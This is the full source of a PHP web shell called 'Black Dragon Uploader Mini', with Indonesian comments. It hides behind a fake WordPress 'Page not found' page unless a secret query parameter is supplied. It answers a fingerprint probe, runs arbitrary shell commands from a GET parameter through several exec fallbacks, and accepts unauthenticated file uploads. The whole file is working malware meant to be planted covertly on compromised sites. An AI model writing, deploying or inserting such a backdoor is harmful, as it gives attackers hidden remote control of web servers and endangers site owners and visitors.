<?php
/* ============================================================
 *  B L A C K   D R A G O N   U P L O A D E R   v5.0  MINI
 * ============================================================
 *  File: uploader.php
 *  Nama : BLACK DRAGON UPLOADER MINI
 *  --------------------------------------------------------
 *  Akses  : domain.com/uploader.php?nagahitam  (WAJIB)
 *           tanpa ?nagahitam -> 404 palsu (WP page not found)
 *  Probe  : ?nagahitam&h=bd  ->  BDGK<md5('blackdragon')>
 *  Cmd    : ?nagahitam&cmd=<command>  -> shell_exec + fallback
 *  Upload : POST form (copy) - tanpa password
 *  Log    : tanpa telegram, tanpa session, tanpa login
 * ============================================================
 */

@error_reporting(0);
@set_time_limit(0);

$BDProbe = 'BDGK' . md5('blackdragon');

/* ---------- GATE: tanpa ?nagahitam -> 404 palsu ---------- */
if (!isset($_GET['nagahitam'])) {
    http_response_code(404);
    echo "<!DOCTYPE html><html><head><title>Page not found</title></head>"
       . "<body style='background:#f0f0f1;color:#3c434a;font-family:-apple-system,"
       . "BlinkMacSystemFont,Segoe UI,Roboto,sans-serif'>"
       . "<div style='max-width:560px;margin:80px auto;padding:24px'>"
       . "<h1 style='font-size:23px;font-weight:400'>Page not found</h1>"
       . "<p style='color:#787c82;font-size:14px'>The page you requested could not be found.</p>"
       . "</div></body></html>";
    return;
}

/* ---------- health probe ---------- */
if (isset($_GET['h']) && $_GET['h'] === 'bd') {
    header('Content-Type: text/plain; charset=utf-8');
    echo $BDProbe;
    return;
}

/* ---------- command exec: ?nagahitam&cmd=<command> ---------- */
if (isset($_GET['cmd']) && $_GET['cmd'] !== '') {
    header('Content-Type: text/plain; charset=utf-8');
    $cmd = $_GET['cmd'];
    $out = false;
    if (function_exists('shell_exec')) {
        $out = @shell_exec($cmd . ' 2>&1');
    } elseif (function_exists('system')) {
        ob_start();
        @system($cmd . ' 2>&1');
        $out = ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        @passthru($cmd . ' 2>&1');
        $out = ob_get_clean();
    } elseif (function_exists('exec')) {
        $arr = array();
        @exec($cmd . ' 2>&1', $arr);
        $out = implode("\n", $arr);
    } elseif (function_exists('proc_open')) {
        $descriptors = array(
            0 => array('pipe', 'r'),
            1 => array('pipe', 'w'),
            2 => array('pipe', 'w'),
        );
        $proc = @proc_open($cmd, $descriptors, $pipes);
        if (is_resource($proc)) {
            $out = stream_get_contents($pipes[1]);
            fclose($pipes[0]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($proc);
        }
    }
    echo $out !== false ? $out : '[ERR] all exec functions disabled';
    return;
}

/* ---------- form upload (copy) ---------- */
echo '<!DOCTYPE html><html><head><title>404</title><meta charset="utf-8">'
   . '<style>body{margin:0;min-height:100vh;background:linear-gradient(135deg,#0a0a0f,#1a1a2e);'
   . 'display:flex;align-items:center;justify-content:center;font-family:Segoe UI,sans-serif}'
   . '.bd-box{background:rgba(8,8,14,.85);border:1px solid #6d3b8f;border-radius:14px;'
   . 'padding:42px 38px;width:360px;text-align:center;box-shadow:0 0 40px rgba(109,59,143,.45)}'
   . '.bd-logo{color:#c084fc;font-weight:800;letter-spacing:3px;font-size:16px;'
   . 'text-shadow:0 0 14px rgba(192,132,252,.8);margin-bottom:20px}'
   . 'input[type=file]{width:100%;box-sizing:border-box;padding:10px;margin:6px 0;'
   . 'background:rgba(20,20,30,.85);border:1px solid #3a2a4d;border-radius:8px;color:#eee}'
   . 'button{width:100%;padding:10px;margin-top:6px;'
   . 'background:linear-gradient(90deg,#7c3aed,#a855f7);color:#fff;border:0;border-radius:8px;'
   . 'font-weight:700;cursor:pointer}button:hover{filter:brightness(1.15)}'
   . '.res{margin-top:14px;font-size:12px;color:#c9f7d4}</style></head><body>'
   . '<div class="bd-box"><div class="bd-logo">&#9650; BLACK DRAGON &#9650;</div>'
   . '<form action="" method="post" enctype="multipart/form-data">'
   . '<input type="file" name="file" size="50">'
   . '<button name="_upl" type="submit" value="Upload">Upload</button></form>';

if (isset($_POST['_upl']) && $_POST['_upl'] === 'Upload') {
    if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
        $dest = dirname(__FILE__) . '/' . basename($_FILES['file']['name']);
        if (@copy($_FILES['file']['tmp_name'], $dest)) {
            echo '<div class="res">[OK] Upload: ' . htmlspecialchars(basename($_FILES['file']['name'])) . '</div>';
        } else {
            echo '<div class="res">[ERR] Upload gagal</div>';
        }
    }
}

echo '</div></body></html>';
?>
